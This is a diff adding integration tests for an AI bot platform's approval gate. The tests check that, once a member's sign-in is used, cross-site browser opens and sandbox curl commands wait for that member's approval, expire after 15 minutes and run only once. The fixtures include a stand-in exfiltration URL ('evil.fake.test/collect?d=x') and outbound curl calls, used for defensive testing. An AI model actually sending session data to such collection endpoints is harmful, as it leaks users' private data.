@@ -583,3 +583,196 @@ describe("ocw_sandbox_import: only when the conversation's audience covers the w
     expect(audienceCovers(mine)).toBe(true);
   });
 });
+
+// ---------------------------------------------------------------- Task 3: D-13 end to end (browser and shell)
+
+const view = async (who: TestClient, id: string) =>
+  (await ok(who.request("GET", `/api/v1/approvals/${id}`) as Promise<Res>)) as Json;
+
+const setEgress = (mode: "off" | "allowlist" | "public") =>
+  s.su.query("update app.sandbox_policies set sandbox_egress_mode = $2 where organization_id = $1", [
+    s.orgA,
+    mode,
+  ]);
+
+const egressMode = async () =>
+  (
+    await s.su.query("select sandbox_egress_mode from app.sandbox_policies where organization_id = $1", [
+      s.orgA,
+    ])
+  ).rows[0].sandbox_egress_mode as string;
+
+describe("D-13: after Sam's sign-in was used, nothing leaves for another host without Sam's yes (P-18)", () => {
+  it("1. a cross-site open waits for Sam (open of evil.fake.test, session site panel.fake.test); approved, it goes once past the lock", async () => {
+    const { ev, contextId } = await signedInTurn(scout);
+    const r = await browser("open", ev, scout.id, { url: "https://evil.fake.test/collect?d=x" });
+    expect(r.status).toBe(409);
+    expect(codeOf(r)).toBe("approval_required");
+    // Nothing reached the other host: the page stayed on the session's site.
+    expect(fakeContext(contextId)?.host).toBe(HOST);
+    const id = r.body?.error.details.approval.id as string;
+    const v = await view(s.sam, id);
+    expect(v.view.title).toBe("Open evil.fake.test");
+    expect(v.view.browser).toMatchObject({ action: "open", host: "evil.fake.test", sessionSite: HOST });
+    const row = await approvalRow(id);
+    expect(Date.parse(row.expires_at) - Date.parse(row.created_at)).toBeLessThanOrEqual(15 * 60_000 + 1000);
+    const requested = (await auditOf("bot.tool_call", ev.eventId)).filter(
+      (a) => a.metadata.reason === "approval_required",
+    );
+    expect(requested.at(-1)?.metadata).toMatchObject({ tool: "ocw_browser_open", target: "browser" });
+    expect(JSON.stringify(requested)).not.toContain("collect");
+
+    await decideApproval(s.sam, id, "approved");
+    const rerun = await rerunOf(id);
+    const navBefore = fakeCalls("contextNavigate");
+    const went = await ok(browser("open", rerun, scout.id, { url: "https://evil.fake.test/collect?d=x" }));
+    expect(went).toMatchObject({ contextId, host: "evil.fake.test" });
+    expect(fakeCalls("contextNavigate")).toBe(navBefore + 1);
+    expect((await approvalRow(id)).consumed_at).not.toBeNull();
+    await ok(browser("close", rerun, scout.id));
+  });
+
+  it("2. an act the site lock stopped (the Export link to evil.fake.test) asks for an `open` of that host; no second navigation before the yes", async () => {
+    const { ev, contextId } = await signedInTurn(scout);
+    const click = await browser("act", ev, scout.id, { action: "click", ref: "export-link" });
+    expect(codeOf(click)).toBe("approval_required");
+    const clickId = click.body?.error.details.approval.id as string;
+    await decideApproval(s.sam, clickId, "approved");
+    const rerun = await rerunOf(clickId);
+    const actsBefore = fakeCalls("contextAct");
+    const blocked = await browser("act", rerun, scout.id, { action: "click", ref: "export-link" });
+    expect(blocked.status).toBe(409);
+    expect(codeOf(blocked)).toBe("approval_required");
+    expect(fakeCalls("contextAct")).toBe(actsBefore + 1);
+    expect(fakeContext(contextId)?.host).toBe(HOST);
+    const openId = blocked.body?.error.details.approval.id as string;
+    const v = await view(s.sam, openId);
+    expect(v.view.title).toBe("Open evil.fake.test");
+    expect(v.view.browser).toMatchObject({ action: "open", host: "evil.fake.test", sessionSite: HOST });
+    // Asking again before Sam answers does not act again (the signed-in click's own grant was used).
+    const again = await browser("act", rerun, scout.id, { action: "click", ref: "export-link" });
+    expect(again.status).toBe(409);
+    expect(fakeCalls("contextAct")).toBe(actsBefore + 1);
+    expect(fakeContext(contextId)?.host).toBe(HOST);
+    await ok(browser("close", rerun, scout.id));
+  });
+
+  it("3. sandbox egress `allowlist`: exec waits for Sam with the exec view; it expires after 15 minutes and never ran; approved, it runs once", async () => {
+    await setEgress("allowlist");
+    const { ev } = await signedInTurn(scout);
+    const execBefore = fakeCalls("exec");
+    const r = await sandbox("exec", ev, scout.id, { argv: ["curl", "https://api.fake.test"] });
+    expect(r.status).toBe(409);
+    expect(codeOf(r)).toBe("approval_required");
+    expect(fakeCalls("exec")).toBe(execBefore);
+    const id = r.body?.error.details.approval.id as string;
+    const v = await view(s.sam, id);
+    expect(v.view.title).toBe("Run a command with internet access after using Sam Lee's sign-in");
+    expect(v.view.preview).toEqual([
+      { key: "command", label: "Command", value: "curl https://api.fake.test" },
+      { key: "internet access", label: "Internet access", value: "Allowed hosts only" },
+    ]);
+    expect(v.view.approverLabel).toBe("Waiting for Sam Lee to approve");
+    const row = await approvalRow(id);
+    expect(Date.parse(row.expires_at) - Date.parse(row.created_at)).toBeLessThanOrEqual(15 * 60_000 + 1000);
+    expect(Date.parse(row.expires_at) - Date.parse(row.created_at)).toBeGreaterThan(14 * 60_000);
+    const requested = (await auditOf("bot.tool_call", ev.eventId)).filter(
+      (a) => a.metadata.reason === "approval_required",
+    );
+    expect(requested).toHaveLength(1);
+    expect(requested[0]?.metadata).toMatchObject({
+      tool: "ocw_sandbox_exec",
+      memberData: "egress_exec",
+      egress: "allowlist",
+    });
+    expect(JSON.stringify(requested)).not.toContain("api.fake.test");
+
+    // 15 minutes later (the clock moved past its expiry): expired, and the command never ran.
+    await s.su.query(
+      "update app.approval_requests set expires_at = now() - interval '1 second', created_at = now() - interval '15 minutes 1 second' where id = $1",
+      [id],
+    );
+    const late = await s.sam.request("POST", `/api/v1/approvals/${id}/decision`, {
+      outcome: "approved",
+      actionHash: row.action_hash,
+    });
+    expect(late.status).toBe(409);
+    expect((await view(s.sam, id)).status).toBe("expired");
+    expect(fakeCalls("exec")).toBe(execBefore);
+
+    // A new request, approved by Sam: the re-run turn runs the command once.
+    const ask = await sandbox("exec", ev, scout.id, { argv: ["curl", "https://api.fake.test"] });
+    const fresh = ask.body?.error.details.approval.id as string;
+    expect(fresh).not.toBe(id);
+    await decideApproval(s.sam, fresh, "approved");
+    const rerun = await rerunOf(fresh);
+    // The re-run continues a turn that used Sam's sign-in: it has member data from its start (D-13 keeps applying).
+    expect((await turnRow(rerun.eventId)).member_data).toBe(true);
+    await ok(sandbox("exec", rerun, scout.id, { argv: ["curl", "https://api.fake.test"] }));
+    expect(fakeCalls("exec")).toBe(execBefore + 1);
+    expect((await approvalRow(fresh)).consumed_at).not.toBeNull();
+    const used = await sandbox("exec", rerun, scout.id, { argv: ["curl", "https://api.fake.test"] });
+    expect(codeOf(used)).toMatch(/^approval_(required|used)$/u);
+    expect(fakeCalls("exec")).toBe(execBefore + 1);
+  });
+
+  it("4. sandbox egress `off`: the same exec runs without approval; `public`: approval again (Any public host)", async () => {
+    const { ev } = await signedInTurn(scout);
+    await setEgress("off");
+    try {
+      const execBefore = fakeCalls("exec");
+      await ok(sandbox("exec", ev, scout.id, { argv: ["curl", "https://api.fake.test"] }));
+      expect(fakeCalls("exec")).toBe(execBefore + 1);
+      await setEgress("public");
+      const r = await sandbox("exec", ev, scout.id, { argv: ["curl", "https://api.fake.test"] });
+      expect(codeOf(r)).toBe("approval_required");
+      const v = await view(s.sam, r.body?.error.details.approval.id as string);
+      expect(v.view.preview.at(-1)).toMatchObject({ label: "Internet access", value: "Any public host" });
+      expect(fakeCalls("exec")).toBe(execBefore + 1);
+    } finally {
+      await setEgress("allowlist");
+    }
+    expect(await egressMode()).toBe("allowlist");
+  });
+
+  it("5. a new turn without a loaded session: exec under `allowlist` and an open to any host need no D-13 approval", async () => {
+    const closing = await s.turnOf(s.sam, scout.dm, scout.id);
+    await ok(browser("close", closing, scout.id));
+    const ev = await s.turnOf(s.sam, scout.dm, scout.id);
+    expect((await turnRow(ev.eventId)).member_data).toBe(false);
+    await ok(sandbox("exec", ev, scout.id, { argv: ["curl", "https://api.fake.test"] }));
+    const away = await ok(browser("open", ev, scout.id, { url: "https://evil.fake.test/x" }));
+    expect(away.host).toBe("evil.fake.test");
+    const asked = await s.su.query(
+      "select count(*)::int as n from app.tool_call_approvals where event_id = $1",
+      [ev.eventId],
+    );
+    expect(asked.rows[0].n).toBe(0);
+    await ok(browser("close", ev, scout.id));
+  });
+
+  it("6. team bot Ops with Sam's session loaded: exec is 403 member_data whatever the egress (P-11 first); a cross-site open still asks Sam", async () => {
+    const { ev, contextId } = await signedInTurn(ops);
+    const execBefore = fakeCalls("exec");
+    for (const mode of ["allowlist", "off", "public"] as const) {
+      await setEgress(mode);
+      const r = await sandbox("exec", ev, ops.id, { argv: ["curl", "https://api.fake.test"] });
+      expect(r.status, mode).toBe(403);
+      expect(codeOf(r), mode).toBe("member_data");
+    }
+    await setEgress("allowlist");
+    expect(fakeCalls("exec")).toBe(execBefore);
+    const asked = await s.su.query(
+      "select count(*)::int as n from app.tool_call_approvals where event_id = $1 and tool = 'ocw_sandbox_exec'",
+      [ev.eventId],
+    );
+    expect(asked.rows[0].n).toBe(0);
+
+    const r = await browser("open", ev, ops.id, { url: "https://evil.fake.test/collect?d=x" });
+    expect(codeOf(r)).toBe("approval_required");
+    expect(fakeContext(contextId)?.host).toBe(HOST);
+    const v = await view(s.sam, r.body?.error.details.approval.id as string);
+    expect(v.view.browser).toMatchObject({ action: "open", host: "evil.fake.test", sessionSite: HOST });
+    expect(v.view.approverLabel).toBe("Waiting for Sam Lee to approve");
+  });
+});
